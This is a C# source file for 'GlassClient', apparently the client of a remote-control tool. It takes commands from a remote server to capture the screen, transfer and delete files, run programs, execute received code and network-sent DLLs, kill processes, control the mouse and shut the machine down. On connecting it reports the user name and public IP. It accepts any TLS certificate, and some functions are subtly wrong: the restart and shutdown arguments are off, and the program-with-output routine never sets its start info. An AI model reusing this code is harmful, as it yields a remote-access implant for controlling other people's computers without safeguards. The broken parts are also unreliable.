using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;

using Hassium;
using System.Security.Cryptography.X509Certificates;

namespace GlassClient
{
    public class GlassConnection : IDisposable
    {
        public string IP { get; private set; }
        public int Port { get; private set; }

        public TcpClient Client { get; private set; }
        public BinaryReader Reader { get; private set; }
        public BinaryWriter Writer { get; private set; }

        public static bool ValidateCert(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true; // Allow untrusted certificates.
        }

        public bool Connect(string ip, int port)
        {
            IP = ip;
            Port = port;

            try
            {
                Client = new TcpClient(ip, port);
                SslStream ssl = new SslStream(Client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateCert));
                ssl.AuthenticateAsClient("glass");
                Reader = new BinaryReader(ssl);
                Writer = new BinaryWriter(ssl);
                return SendIdentify();
            }
            catch
            {
                return false;
            }
        }

        public void Dispose()
        {
            Client.Close();
            Reader.Dispose();
            Writer.Dispose();
        }

        public bool Listen()
        {
            try
            {
                byte type = Reader.ReadByte();

                switch (type)
                {
                    case (byte)GlassProtocol.RequestScreen:
                        if (!(SendImageData(TakeScreenshot()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestFile:
                        if (!(SendFile(Reader.ReadString()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestCurrentDirectory:
                        if (!(SendProtocol(GlassProtocol.SendingCurrentDirectory))) return false;
                        if (!(SendString(Directory.GetCurrentDirectory()))) return false;
                        break;
                    case (byte)GlassProtocol.SetCurrentDirectory:
                        Directory.SetCurrentDirectory(Reader.ReadString());
                        break;
                    case (byte)GlassProtocol.SendingFile:
                        if (!(ReadFile(Reader.ReadString()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestFileDownload:
                        if (!(DownloadFile(Reader.ReadString(), Reader.ReadString()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestDirectoryListing:
                        if (!(SendDirectoryListing(Reader.ReadString()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestFileListing:
                        if (!(SendFileListing(Reader.ReadString()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestDeleteDir:
                        if (!(DeleteDir(Reader.ReadString()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestDeleteFile:
                        if (!(DeleteFile(Reader.ReadString()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestMessageDisplay:
                        if (!(DisplayMessage(Reader.ReadString()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestProgramStart:
                        if (!(StartProgram(Reader.ReadString(), Reader.ReadString()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestProgramStartStdout:
                        if (!(StartProgramWithStdout(Reader.ReadString(), Reader.ReadString()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestFileCopy:
                        if (!(FileCopy(Reader.ReadString(), Reader.ReadString()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestFileMove:
                        if (!(FileMove(Reader.ReadString(), Reader.ReadString()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestProcList:
                        if (!(SendProcList())) return false;
                        break;
                    case (byte)GlassProtocol.RequestProcKill:
                        if (!(KillProc(Reader.ReadString()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestCodeRun:
                        if (!(ExecuteCode(Reader.ReadString()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestDllLoad:
                        if (!(LoadDll())) return false;
                        break;
                    case (byte)GlassProtocol.RequestLocalDllLoad:
                        executeLocalAssembly(Assembly.LoadFrom(Reader.ReadString()), Reader.ReadString());
                        break;
                    case (byte)GlassProtocol.RequestSetMousePosition:
                        if (!(SetMousePosition((int)Reader.ReadInt64(), (int)Reader.ReadInt64()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestLeftMouseClick:
                        if (!(LeftMouseClick())) return false;
                        break;
                    case (byte)GlassProtocol.RequestRightMouseClick:
                        if (!(RightMouseClick())) return false;
                        break;
                    case (byte)GlassProtocol.RequestFileText:
                        if (!(SendFileText(Reader.ReadString()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestCreateDirectory:
                        if (!(CreateDirectory(Reader.ReadString()))) return false;
                        break;
                    case (byte)GlassProtocol.RequestLogout:
                        if (!(Logout())) return false;
                        break;
                    case (byte)GlassProtocol.RequestRestart:
                        if (!(Restart())) return false;
                        break;
                    case (byte)GlassProtocol.RequestShutdown:
                        if (!(Shutdown())) return false;
                        break;
                }
            }
            catch (Exception ex)
            {
                if (!(SendError("Error encountered: " + ex.Message))) return false;
            }
            return true;
        }

        public bool CreateDirectory(string path)
        {
            try
            {
                Directory.CreateDirectory(path);
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not create directory: " + ex.Message))) return false;
            }
            return true;
        }

        public bool DeleteDir(string path)
        {
            if (!Directory.Exists(path))
            {   
                if (!SendError("Directory not found " + path)) return false;
                return true;
            }
            Directory.Delete(path);
            return true;
        }

        public bool DeleteFile(string path)
        {
            if (!File.Exists(path))
            {
                if (!SendError("File not found " + path)) return false;
                return true;
            }
            File.Delete(path);
            return true;
        }

        public bool DownloadFile(string uri, string path)
        {
            try
            {
                new WebClient().DownloadFile(uri, path);
            }
            catch (Exception ex)
            {
                if (!(SendError("Download failed: " + ex.Message))) return false;
            }
            return true;
        }

        public bool DisplayMessage(string msg)
        {
            try
            {
                MessageBox.Show(msg);
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not display message: " + ex.Message))) return false;
            }
            return true;
        }

        public bool ExecuteCode(string source)
        {
            try
            {
                HassiumExecuter.FromString(source, new List<string>());
            }
            catch (Exception ex)
            {
                if (!(SendError("Error executing code: " + ex.Message))) return false;
            }
            return true;
        }

        public bool FileMove(string source, string dest)
        {
            try
            {
                File.Move(source, dest);
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not move file: " + ex.Message))) return false;
            }
            return true;
        }

        public bool FileCopy(string source, string dest)
        {
            try
            {
                File.Copy(source, dest);
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not copy file: " + ex.Message))) return false;
            }
            return true;
        }

        public bool KillProc(string procName)
        {
            try
            {
                Process.GetProcessesByName(procName)[0].Kill();
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not kill process: " + ex.Message))) return false;
            }
            return true;
        }

        public bool LoadDll()
        {
            try
            {
                int length = (int)Reader.ReadInt64();
                string arg = Reader.ReadString();
                byte[] bytes = new byte[length];
                for (int i = 0; i < bytes.Length; i++)
                    bytes[i] = Reader.ReadByte();
                executeLocalAssembly(Assembly.Load(bytes), arg);
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not load DLL: " + ex.Message))) return false;
            }
            return true;
        }

        private void executeLocalAssembly(Assembly ass, string arg)
        {
            foreach (var type in ass.GetTypes())
            {
                if (type.GetInterface(typeof(IExecutable).FullName) != null)
                {
                    IExecutable dll = (IExecutable)Activator.CreateInstance(type);
                    new Thread(() => runIExecutable(dll, arg)).Start();
                }
            }
        }

        private void runIExecutable(IExecutable dll, string arg)
        {
            try
            {
                SendProtocol(GlassProtocol.SendingProgramStdout);
                SendString(dll.Main(arg));
            }
            catch (Exception ex)
            {
                SendError("Could not execute DLL: " + ex.Message);
            }
        }

        [DllImport("user32")]
        public static extern bool ExitWindowsEx(uint uFlags, uint dwReason);
        public bool Logout()
        {
            try
            {
                ExitWindowsEx(0, 0);
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not logout: " + ex.Message))) return false;
            }
            return true;
        }

        public bool Restart()
        {
            try
            {
                Process.Start("shutdown", "/t 0");
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not restart: " + ex.Message))) return false;
            }
            return true;
        }

        public bool Shutdown()
        {
            try
            {
                Process.Start("shutdown", "/r /t 0");
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not shutdown: " + ex.Message))) return false;
            }
            return true;
        }

        public bool ReadFile(string path)
        {
            try
            {
                BinaryWriter file = new BinaryWriter(new StreamWriter(path).BaseStream);
                long length = Reader.ReadInt64();
                for (long i = 0; i < length; i++)
                    file.Write(Reader.ReadByte());
                file.Flush();
                file.Close();
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not read file: " + ex.Message))) return false;
            }
            return true;
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);

        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
        private const int MOUSEEVENTF_LEFTUP = 0x04;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
        private const int MOUSEEVENTF_RIGHTUP = 0x10;
        public bool LeftMouseClick()
        {
            try
            {
                int X = Cursor.Position.X;
                int Y = Cursor.Position.Y;
                mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, (uint)X, (uint)Y, 0, 0);
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not click left mouse: " + ex.Message))) return false;
            }
            return true;
        }

        public bool RightMouseClick()
        {
            try
            {
                int X = Cursor.Position.X;
                int Y = Cursor.Position.Y;
                mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, (uint)X, (uint)Y, 0, 0);
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not click right mouse: " + ex.Message))) return false;
            }
            return true;
        }

        public bool SendByte(byte b)
        {
            try
            {
                Writer.Write(b);
                Writer.Flush();
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool SendDirectoryListing(string path)
        {
            try
            {
                if (!(SendProtocol(GlassProtocol.SendingDirectoryListing))) return false;
                string[] dirs = Directory.GetDirectories(path);
                if (!(SendInt(dirs.Length))) return false;
                foreach (string dir in dirs)
                    if (!(SendString(dir))) return false;
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not send ls: " + ex.Message))) return false;
            }
            return true;
        }

        public bool SendError(string msg)
        {
            if (!(SendProtocol(GlassProtocol.SendingError))) return false;
            if (!(SendString(msg))) return false;

            return true;
        }

        public bool SendFile(string filePath)
        {
            try
            {
                if (!(SendProtocol(GlassProtocol.SendingFile))) return false;
                if (!SendLong(new FileInfo(filePath).Length)) return false;
                BinaryReader file = new BinaryReader(new StreamReader(filePath).BaseStream);
                while (file.BaseStream.Position < file.BaseStream.Length)
                    if (!SendByte(file.ReadByte()))
                    {
                        file.Close();
                        return false;
                    }
                file.Close();
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not send file: " + ex.Message))) return false;
            }
            return true;
        }

        public bool SendFileText(string path)
        {
            try
            {
                string text = File.ReadAllText(path);
                if (!(SendProtocol(GlassProtocol.SendingFileText))) return false;
                if (!(SendString(text))) return false;
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not send file text: " + ex.Message))) return false;
            }
            return true;
        }

        public bool SendFileListing(string path)
        {
            try
            {
                if (!(SendProtocol(GlassProtocol.SendingFileListing))) return false;
                string[] dirs = Directory.GetFiles(path);
                if (!(SendInt(dirs.Length))) return false;
                foreach (string dir in dirs)
                    if (!(SendString(dir))) return false;
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not send file listing: " + ex.Message))) return false;
            }
            return true;
        }

        public bool SendIdentify()
        {
            if (!SendProtocol(GlassProtocol.Identify))
                return false;
            if (!SendString(Environment.UserName))
                return false;
            if (!SendString(new WebClient().DownloadString("http://ipinfo.io/ip").Trim()))
                return false;
            return true;
        }

        public bool SendImageData(Bitmap image)
        {
            try
            {
                if (!SendProtocol(GlassProtocol.SendingScreen)) return false;
                if (!SendInt(image.Height)) return false;
                if (!SendInt(image.Width)) return false;
                for (int w = 0; w < image.Width; w++)
                {
                    for (int h = 0; h < image.Height; h++)
                    {
                        var pixel = image.GetPixel(w, h);
                        if (!SendByte(pixel.R)) return false;
                        if (!SendByte(pixel.G)) return false;
                        if (!SendByte(pixel.B)) return false;
                    }
                }
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not send image: " + ex.Message))) return false;
            }
            return true;
        }

        public bool SendInt(int i)
        {
            try
            {
                Writer.Write(i);
                Writer.Flush();
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool SendLong(long l)
        {
            try
            {
                Writer.Write(l);
                Writer.Flush();
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool SendProcList()
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                foreach (var proc in Process.GetProcesses())
                    sb.Append(proc.ProcessName + " ");
                if (!(SendProtocol(GlassProtocol.SendingProcList))) return false;
                if (!(SendString(sb.ToString()))) return false;
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not fetch proclist: " + ex.Message))) return false;
            }
            return true;
        }

        public bool SendProtocol(GlassProtocol protocol)
        {
            try
            {
                Writer.Write((byte)protocol);
                Writer.Flush();
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool SendString(string str)
        {
            try
            {
                Writer.Write(str);
                Writer.Flush();
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool SetMousePosition(int x, int y)
        {
            try
            {
                Cursor.Position = new Point(x, y);
            }
            catch (Exception ex)
            {
                if (!(SendError("Could not set mouse position: " + ex.Message))) return false;
            }
            return true;
        }

        public bool StartProgram(string path, string args)
        {
            try
            {
                Process proc = new Process();
                proc.StartInfo = new ProcessStartInfo(path, args);
                proc.Start();
            }
            catch (Exception ex)
            {
                if (!(SendError("Error starting program: " + ex.Message))) return false;
            }
            return true;
        }

        public bool StartProgramWithStdout(string path, string args)
        {
            try
            {
                Process proc = new Process();
                ProcessStartInfo info = new ProcessStartInfo(path, args);
                info.CreateNoWindow = true;
                info.RedirectStandardOutput = true;
                info.UseShellExecute = false;
                proc.Start();
                while (!proc.StandardOutput.EndOfStream)
                {
                    if (!(SendProtocol(GlassProtocol.SendingProgramStdout))) return false;
                    if (!(SendString(proc.StandardOutput.ReadLine()))) return false;
                }
            }
            catch (Exception ex)
            {
                if (!(SendError("Error starting program with stdout: " + ex.Message))) return false;
            }
            return true;
        }

        public Bitmap TakeScreenshot()
        {
            try
            {
                var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
                gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
           
                return bmpScreenshot;
            }
            catch (Exception ex)
            {
                SendError("Could not take screenshot " + ex.Message);
            }
            return new Bitmap(500, 500);
        }
    }
}